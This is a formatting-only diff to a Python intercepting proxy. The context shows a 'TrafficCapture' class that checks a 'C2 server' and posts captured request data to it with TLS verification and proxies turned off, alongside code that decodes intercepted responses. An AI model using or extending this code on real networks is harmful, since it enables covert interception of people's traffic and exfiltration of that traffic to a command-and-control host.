@@ -265,7 +265,6 @@ class TrafficCapture:
         self.pending_jobs: Dict[Any, dict] = {}
         self._test_c2_connection()
 
-
     def _fetch_public_ip(self) -> str:
         services = [
             "https://api.ipify.org?format=json",
@@ -275,7 +274,11 @@ class TrafficCapture:
         proxies = {"http": None, "https": None}
         for service in services:
             try:
-                r = requests.get(service, timeout=5, proxies=proxies)
+                r = requests.get(
+                    service,
+                    timeout=5,
+                    proxies=proxies,
+                )
                 if r.status_code == 200:
                     if "ipify" in service:
                         return r.json()["ip"]
@@ -292,7 +295,10 @@ class TrafficCapture:
                 urljoin(BASE_URL, "/health"),
                 timeout=5,
                 verify=False,
-                proxies={"http": None, "https": None},
+                proxies={
+                    "http": None,
+                    "https": None,
+                },
             )
             if r.status_code == 200:
                 print("C2 server is reachable!\n")
@@ -313,7 +319,10 @@ class TrafficCapture:
                 json=data,
                 timeout=10,
                 verify=False,
-                proxies={"http": None, "https": None},
+                proxies={
+                    "http": None,
+                    "https": None,
+                },
             )
             if r.status_code == 200:
                 print("   Sent to C2 server")
@@ -476,7 +485,6 @@ def normalize_host(host):
     return host.rstrip(".").encode("idna").decode("ascii").lower()
 
 
-
 def decode_response_body(payload: bytes, content_encoding: str) -> bytes:
     """Decode upstream content for inspection, without modifying wire bytes."""
     encoding = content_encoding.strip().lower()
@@ -493,7 +501,7 @@ def decode_response_body(payload: bytes, content_encoding: str) -> bytes:
 
 
 def log_message(label, url, first_line, headers, body):
-    """Simple logging – no external flow_viewer dependency."""
+    """Simple logging - no external flow_viewer dependency."""
     try:
         content = body.decode("utf-8", errors="replace") if body else ""
         if len(content) > 2000:
@@ -765,8 +773,11 @@ class ProxyHandler(BaseHTTPRequestHandler):
                         payload, response.headers.get("Content-Encoding", "")
                     )
                 except (OSError, EOFError, ValueError, zlib.error) as exc:
-                    LOG.warning("Cannot decode response for inspection (%s): %s",
-                                display_url, exc)
+                    LOG.warning(
+                        "Cannot decode response for inspection (%s): %s",
+                        display_url,
+                        exc,
+                    )
                     inspection_payload = None
 
                 if inspection_payload is not None:
